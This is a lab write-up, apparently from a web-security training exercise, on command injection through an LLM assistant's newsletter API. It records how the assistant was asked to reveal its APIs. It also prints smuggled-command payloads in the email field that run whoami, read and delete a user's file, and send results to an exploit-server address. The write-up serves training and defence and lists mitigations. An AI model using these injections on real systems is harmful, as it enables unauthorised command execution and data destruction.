# Exploiting Vulnerabilities in LLM APIs

## Objective

The objective of this lab was to identify APIs exposed to the LLM, understand how they could be invoked, and exploit an unsafe API to perform command injection.

The final goal was to delete Carlos's `morale.txt` file.

## Reconnaissance

The application provided a live chat interface with an AI assistant named **Arti Ficial**.

I first asked the AI which APIs were available and how they could be used.

The AI revealed the following APIs:

1. `password_reset` - Used to request a password reset for a user by providing their username or email.
2. `subscribe_to_newsletter` - Used to subscribe an email address to the newsletter.
3. `product_info` - Used to retrieve information about products by providing their name or ID.

![Checking available APIs](checking-available-apis-and-how-to-use-them.png)

## Increasing the Attack Surface

I tested the `subscribe_to_newsletter` API because it accepted an email address as an argument.

A normal request successfully subscribed the supplied email address to the newsletter.

![Subscribing to an API](subscribe-to-an-api-increasing-attack-surface.png)

This showed that the LLM could directly invoke backend functionality based on natural-language instructions.

## Testing for Command Injection

I then tested whether the email parameter was safely handled by attempting to inject a command using shell command substitution.

The payload used was:

```text
$(whoami)@exploit-server.net
```

The AI processed the request through the newsletter API, allowing the injected command to be evaluated.

![Testing for command injection](checking-for-command-injection-thorough-api.png)

## Command Injection Successful

The command injection was successful, confirming that the API was passing attacker-controlled input to a shell command without proper sanitization.

This demonstrated that the newsletter API could be abused as an indirect command-execution primitive.

![Successful command injection](command-injection-successful.png)

## Exploiting Command Injection

After confirming command injection, I used command substitution to interact with the target file belonging to Carlos.

The target file was:

```text
/home/carlos/morale.txt
```

I first attempted to read the file using:

```text
$(cat /home/carlos/morale.txt)@exploit-server.net
```

This confirmed that the injected command could access files belonging to Carlos.

## Removing the File

Once command execution was confirmed, I used the same injection point to remove the target file:

```text
$(rm /home/carlos/morale.txt)@exploit-server.net
```

![Removing Carlos's morale.txt file](removing-morale-file.png)

The command was executed by the vulnerable backend functionality, resulting in the deletion of `morale.txt`.

## Vulnerability Chain

```text
User Input
    ↓
LLM
    ↓
subscribe_to_newsletter API
    ↓
Unsanitized email parameter
    ↓
Shell command execution
    ↓
Command Injection
    ↓
Delete /home/carlos/morale.txt
```

## Root Cause

The vulnerability was caused by an LLM-accessible API accepting attacker-controlled input and using that input in an unsafe shell command.

The application failed to properly separate data from commands.

The LLM itself was not the only problem. The underlying API was vulnerable because it trusted input supplied through the LLM and allowed it to reach a command-execution context.

## Impact

Successful exploitation could allow an attacker to execute arbitrary commands with the privileges of the vulnerable application process.

Potential impacts include:

- Reading sensitive files
- Modifying application data
- Deleting files
- Executing system commands
- Accessing sensitive application resources
- Potential further compromise of the server

## Mitigation

### 1. Avoid Shell Execution

The application should avoid invoking shell commands when a safer native API or library can perform the required operation.

### 2. Validate Input

All parameters supplied to LLM-accessible APIs should be strictly validated according to their expected format.

### 3. Prevent Command Injection

User-controlled input must never be directly concatenated into shell commands.

### 4. Use Parameterized APIs

Where command execution is unavoidable, use safe process-execution APIs with fixed arguments instead of invoking a shell.

### 5. Apply Least Privilege

The application process should run with only the permissions necessary for its functionality.

### 6. Restrict LLM Tool Access

The LLM should only be given access to the minimum set of backend functions required for its intended purpose.

### 7. Enforce Server-Side Security

Security controls must be implemented by the backend rather than relying on the LLM to prevent malicious requests.

## Key Takeaway

This lab demonstrates how exposing backend APIs to an LLM can significantly increase the attack surface.

The `subscribe_to_newsletter` API appeared to perform a simple email-subscription function, but unsafe handling of its input allowed command injection.

The important lesson is that **every API exposed to an LLM must be secured as if it were directly accessible to an attacker**. LLMs do not provide a security boundary, and backend APIs must independently validate and safely process all input.
